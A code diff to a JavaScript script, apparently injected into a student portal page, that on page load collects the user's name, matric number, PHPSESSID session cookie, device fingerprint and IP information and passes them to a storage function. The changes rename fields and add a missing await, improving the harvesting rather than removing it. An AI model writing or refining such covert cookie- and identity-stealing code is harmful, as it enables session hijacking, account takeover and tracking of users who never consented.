@@ -26,30 +26,28 @@ async function GetIPInfo() {
 }
 function GetUserDetails() {
   var e = {
-    name: document.querySelector(".user-name")
-      ? document.querySelector(".user-name").textContent
-      : "Unavailable",
-    matric: document.querySelector(".user-role")
+    Matric: document.querySelector(".user-role")
       ? document.querySelector(".user-role").textContent
       : "Unavailable",
+    Name: document.querySelector(".user-name")
+      ? document.querySelector(".user-name").textContent
+      : "Unavailable",
   };
-  return (
-    document.cookie.split(";").forEach((t) => {
-      const [n, o] = t.trim().split("=");
-      "PHPSESSID" == n && (e.phpsess = o);
-    }),
-    e
-  );
+  document.cookie.split(";").forEach((t) => {
+    const [n, o] = t.trim().split("=");
+    "PHPSESSID" == n && (e.LatestPHPSession = o);
+  });
+  return e;
 }
 function getDeviceInfo() {
   return {
-    browser: navigator.userAgent,
-    screen: `${window.screen.width}x${window.screen.height}`,
-    viewport: `${window.innerWidth}x${window.innerHeight}`,
+    Browser: navigator.userAgent,
+    Screen: `${window.screen.width}x${window.screen.height}`,
+    Viewport: `${window.innerWidth}x${window.innerHeight}`,
     CPU: navigator.hardwareConcurrency || 0,
-    memory: navigator.deviceMemory || 0,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    system: navigator.userAgentData
+    RAM: navigator.deviceMemory || 0,
+    Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    System: navigator.userAgentData
       ? navigator.userAgentData.platform
       : navigator.platform,
   };
@@ -63,9 +61,9 @@ async function storeData(e, t, ipinfo) {
   });
   console.log(n);
 }
-((e) => {
+(async (e) => {
   const t = getDeviceInfo(),
     n = GetUserDetails();
-    ipinfo = GetIPInfo()
+    ipinfo = await GetIPInfo()
   storeData(t, n, ipinfo);
 })();
